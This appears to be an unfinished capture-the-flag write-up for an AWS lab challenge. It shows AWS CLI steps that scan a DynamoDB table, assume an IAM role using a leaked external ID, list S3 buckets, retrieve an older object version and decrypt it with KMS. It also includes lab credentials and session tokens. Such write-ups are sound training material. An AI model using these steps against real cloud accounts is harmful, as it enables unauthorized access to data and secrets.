---
tags:
  - ctf
  - aws
difficulty: medium
category:
---
# Challenge

Miren Vale attends a Suncourt meeting where officers are deciding who will guard the east road. A false story is already spreading, one of Stormbound's captains supposedly sold the road schedule to Vaultrune. By the time Miren arrives, the rumor has reached the commanders as a formal accusation. By morning, the captain's unit may get pulled from the road, leaving the supply carts without guards. Miren can't accuse Lady Seralyne, the woman who runs Suncourt, in front of the room. The officers would call it gossip, and the order would still go out. Miren has to find who started the rumor and who paid to spread it.

You hold Eastreach supply auditor access to the `supply-road-settlements` registry, where road assignments and settlement records are kept. Scan the table and isolate the LIVE row connected to the current accusation.

## Solution

### Initial Creds

```creds
export AWS_ENDPOINT_URL=http://<challenge-ip>:<aws-port>
export AWS_DEFAULT_REGION=us-east-1
export AWS_ACCESS_KEY_ID=AKIAUX9MUM9Z0GLOS4I9
export AWS_SECRET_ACCESS_KEY=UhVlaaVZEZlzIn+MOZqxkaZ82jFUIxqodVl+jw31
unset AWS_SESSION_TOKEN
```

### Recon

Since the description mentioned scanning the table I used aws dynamodb to scan that table and I used `tee` to put the output into a json file for better parsing

```bash
aws dynamodb scan --table-name supply-road-settlements | tee supply_road_settlements.json
```

This returned a list of Items that have a status, and since it asks me to scan and find the LIVE status I used `jq` to parse for the statuses to verify it was `LIVE` that I was looking for and then filtered for that entry

```bash
jq '.Items[].status' supply_road_settlements.json | sort -u

  "S": "CLOSED"
  "S": "DRAFT"
  "S": "LIVE"
  "S": "PENDING_AUDIT"
  "S": "VOID"
```

```bash
jq '.Items[] | select(.status.S == "LIVE")' supply_road_settlements.json

  "settlement_id": {
    "S": "ROAD-3D9C"
  },
  "status": {
    "S": "LIVE"
  },
  "runner_external_id": {
    "S": "eastreach-supply-road-runner-3d9c"
  },
  "broker_code": {
    "S": "EASTREACH-RELAY"
  },
  "scanner_role_arn": {
    "S": "arn:aws:iam::593847102664:role/supply-road-scanner"
  },
  "scanner_external_id": {
    "S": "eastreach-road-scanner-3d9c"
  },
  "vendor_ref": {
    "S": "eastreach-continuity"
  },
  "manifest_bucket": {
    "S": "supply-road-manifests"
  }
```

This gave me a new role arn and external ID that I might be able to impersonate:
`arn:aws:iam::593847102664:role/supply-road-scanner`
`eastreach-road-scanner-3d9c`

As well as an external ID that doesn't have a role arn mentioned but we may be able to infer:
`eastreach-supply-road-runner-3d9c`
inferred: `arn:aws:iam::593847102664:role/supply-road-runner`

I was able to assume the role of the supply-road-scanner

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::593847102664:role/supply-road-scanner \
  --role-session-name bought-riot \
  --external-id eastreach-road-scanner-3d9c
  
  {
    "Credentials": {
        "AccessKeyId": "ASIAS77VJ8VDRDT28DIY",
        "SecretAccessKey": "qPUHGk9VNyr3LB4Bgu6usrv8vuNGFEIAcUydd3C9",
        "SessionToken": "BEv7sPI9y46LMK5ysh12d2Uv7PGSMcEDerkBGGN9FdPjWaXsVwbREua0Y8MQbN4g10Y4WrLQOfxULcyyURM7wxmRvlUfc1WO9qWKu1xypnyDODJCeLusmM6HmyQGnL5MYrXAnCTrgecr538syvvo3tjTjs0Iz4Ce4wkXb8cGxnSCNy8pWb32fchbrBzqR2RBNSn8pwie",
        "Expiration": "2026-07-27T17:22:35.032071+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA1N09SP0FTHTK1UAJ:bought-riot",
        "Arn": "arn:aws:sts::593847102664:assumed-role/supply-road-scanner/bought-riot"
    },
    "PackedPolicySize": 0
}
```

Since the dynamodb entry mentioned a manifests bucket, I decided to check for an `s3` bucket named `supply-road-manifests`

```bash
aws s3 ls s3://supply-road-manifests/         

PRE archives/
PRE compliance/
PRE manifests/
PRE routing-notes/
```

Going further to try and find the manifest I found the manifest for the LIVE road, `ROAD-3D9C`

```bash
aws s3 ls s3://supply-road-manifests/manifests/

2026-07-27 10:25:45        231 ROAD-0185.json
2026-07-27 10:25:45        214 ROAD-03C6.json
2026-07-27 10:25:44        224 ROAD-03EF.json
2026-07-27 10:25:43        215 ROAD-0562.json
2026-07-27 10:25:45        238 ROAD-0679.json
2026-07-27 10:25:44        226 ROAD-0ADF.json
2026-07-27 10:25:45        216 ROAD-0C0D.json
2026-07-27 10:25:45        214 ROAD-10A7.json
2026-07-27 10:25:45        203 ROAD-10B1.json
2026-07-27 10:25:45        224 ROAD-149F.json
2026-07-27 10:25:44        205 ROAD-14E5.json
2026-07-27 10:25:45        224 ROAD-154E.json
2026-07-27 10:25:44        207 ROAD-1557.json
2026-07-27 10:25:44        220 ROAD-189C.json
2026-07-27 10:25:44        219 ROAD-18B0.json
2026-07-27 10:25:45        218 ROAD-1960.json
2026-07-27 10:25:44        224 ROAD-1C22.json
2026-07-27 10:25:44        216 ROAD-1D71.json
2026-07-27 10:25:44        204 ROAD-1DF2.json
2026-07-27 10:25:44        213 ROAD-22B8.json
2026-07-27 10:25:44        215 ROAD-2345.json
2026-07-27 10:25:44        203 ROAD-2384.json
2026-07-27 10:25:45        221 ROAD-263B.json
2026-07-27 10:25:45        237 ROAD-26CA.json
2026-07-27 10:25:45        213 ROAD-27A1.json
2026-07-27 10:25:44        200 ROAD-29B6.json
2026-07-27 10:25:44        223 ROAD-2B5A.json
2026-07-27 10:25:45        220 ROAD-2C95.json
2026-07-27 10:25:44        240 ROAD-2DA3.json
2026-07-27 10:25:44        221 ROAD-3036.json
2026-07-27 10:25:45        202 ROAD-3081.json
2026-07-27 10:25:45        223 ROAD-34A9.json
2026-07-27 10:25:45        204 ROAD-3649.json
2026-07-27 10:25:45        204 ROAD-365B.json
2026-07-27 10:25:45        238 ROAD-375D.json
2026-07-27 10:25:44        213 ROAD-37F5.json
2026-07-27 10:25:43        155 ROAD-3C21.json
2026-07-27 10:25:43        382 ROAD-3D9C.json
```

```bash
aws s3 cp s3://supply-road-manifests/manifests/ROAD-3D9C.json ./

download: s3://supply-road-manifests/manifests/ROAD-3D9C.json to ./ROAD-3D9C.json
```

```bash
jq . ROAD-3D9C.json         

{
  "settlement_id": "ROAD-3D9C",
  "status": "COMPLIANCE_HOLD",
  "manifest_version": "2026-03",
  "note": "Routing manifest under compliance review. Sensitive fields redacted pending clearance from Road Compliance.",
  "broker_user": "REDACTED",
  "runner_role_arn": "REDACTED",
  "payout_secret_name": "REDACTED",
  "schema_version": "2026-03",
  "owner": "eastreach-logistics"
}
```

Since the status says `COMPLIANCE_HOLD` I want to check the compliance folder from before to see if something is there.

```bash
aws s3 ls s3://supply-road-manifests/compliance/                              

2026-07-27 10:25:46        142 archive-3737.txt
2026-07-27 10:25:46        139 archive-9868.txt
2026-07-27 10:25:46        135 hold-4847.txt
2026-07-27 10:25:46        134 hold-5442.txt
2026-07-27 10:25:46        138 review-1175.txt
2026-07-27 10:25:46        129 review-2697.txt
2026-07-27 10:25:46        131 review-4506.txt
2026-07-27 10:25:46        134 review-5929.txt
```

Only 2 seem to be on hold and 4 on review. I will try and download them all

```bash
aws s3 cp s3://supply-road-manifests/compliance/hold-5442.txt ./

fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

Can't download the hold ones, both give back Forbidden.

```bash
aws s3 cp s3://supply-road-manifests/compliance/review-5929.txt ./

fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

Got Forbidden on the review ones as well. I tried the archive too just to be sure and got Forbidden on them too.

I realized that there was a `list-object-versions` for the `aws s3api` and saw that the version schema was an option for the `ROAD-3D9C.json` file, so I decided to see if there was something there.

```bash
aws s3api list-objects --bucket supply-road-manifests | jq '.Contents[] | select(.Key == "manifests/ROAD-3D9C.json")'        

{
  "Key": "manifests/ROAD-3D9C.json",
  "LastModified": "2026-07-27T18:37:06+00:00",
  "ETag": "\"7c4be6991492f08f9f36dd75877a04c9\"",
  "Size": 382,
  "StorageClass": "STANDARD"
}
                                                                                                                                                                                                                                            
┌──(ghost㉿gcttoolkit66)-[/mnt/…/htb/ctf/apocalypse/bought_riot]
└─$ aws s3api list-object-versions --bucket supply-road-manifests | jq '.Versions[] | select(.Key == "manifests/ROAD-3D9C.json")'

{
  "ETag": "\"7c4be6991492f08f9f36dd75877a04c9\"",
  "Size": 382,
  "StorageClass": "STANDARD",
  "Key": "manifests/ROAD-3D9C.json",
  "VersionId": "82d6aba0-9a1f-4b7a-bd06-5059c4da7ad8",
  "IsLatest": true,
  "LastModified": "2026-07-27T18:37:06+00:00"
}
{
  "ETag": "\"3ccf0798cbde40267e206659004ee150\"",
  "Size": 491,
  "StorageClass": "STANDARD",
  "Key": "manifests/ROAD-3D9C.json",
  "VersionId": "c154636f-05e7-4a7e-b165-0de60598c21b",
  "IsLatest": false,
  "LastModified": "2026-07-27T18:37:06+00:00"
}
```

There is an older version, lets see what that shows

```bash
aws s3api get-object --bucket supply-road-manifests --key manifests/ROAD-3D9C.json --version-id a3632c37-7631-42d7-b026-ddb850584b3a ./ROAD-3D9C-version-1.json 

{ "AcceptRanges": "bytes", "LastModified": "2026-07-27T15:25:43+00:00", "ContentLength": 491, "ETag": "\"cc7b180208435fb2631211788b474329\"", "ChecksumCRC32": "VaV1Rw==", "VersionId": "a3632c37-7631-42d7-b026-ddb850584b3a", "ContentType": "application/octet-stream", "Metadata": {}, "StorageClass": "STANDARD" }

cat ROAD-3D9C-version-1.json

kms:v3:a046600c-5679-46aa-a544-db9ff3274ea3:K75WcrcEq7fvrM2g:Zoy3kUuDN7b592O6TpLmtXv4nfNH1ehREnyv11vT5IGJdmbKm0MQO_UH0rcJ00Xlw_2sNk63PF0Gjb-s8xG75iZwY0PreNdkXPM09_tvmbPy1xCAc8TCF0frHkLMoKJfIAMpubn49MwXY_das0M4zrYrpgDBN9TQdMmHvVaMNGMkHFNTpF7KW0xo4NHwBcrOgka6WARmO0gwDEp5qdOTSNUUzh1-0OGzlPiLpOLwUrqZKoy6ZFV2rACjIRtiu2Ve5m8mDU2f9d-ZwnyUjUhspZ0djwBz88lTL8fCoRqQuMgXKxuzr4uWQ7eNuk3KJuzHxEJjHoGeSOXtDAzcs31pG_x_fOXWVLVV6xf1FkiEkQ_oxQNwkgQUnBIkOuBxarntbDxcgmatDuYQxrPu6P2xNVkgyoZs80mWeBnN1lGOspxVOA
```

It is encrypted, lets decrypt it

```bash
aws kms decrypt --ciphertext-blob fileb://ROAD-3D9C-version-1.json --key-id a046600c-5679-46aa-a544-db9ff3274ea3 --output text --query Plaintext | base64 -d > ROAD-3D9C-version-1-decrypted.json

jq . ROAD-3D9C-version-1-decrypted.json 

{ "settlement_table": "supply-road-settlements", "broker_user": "road-messenger", "runner_role_arn": "arn:aws:iam::593847102664:role/supply-road-runner", "payout_secret_name": "supply-road/payout/eastreach-relay-3d9c", "broker_code_template": "{broker_code}", "schema_version": "2026-01", "owner": "eastreach-logistics" }
```

This gives us a new possible user and confirms the runner role arn, but we still can't assume that role
This also gives us the path to the secret that we are probably looking for, but we don't have a user that can read it 

I tried to assume the role of the road-messenger but that didn't work
## Lessons Learned

<!-- Anything worth remembering for next time - technique, gotcha, tool quirk -->
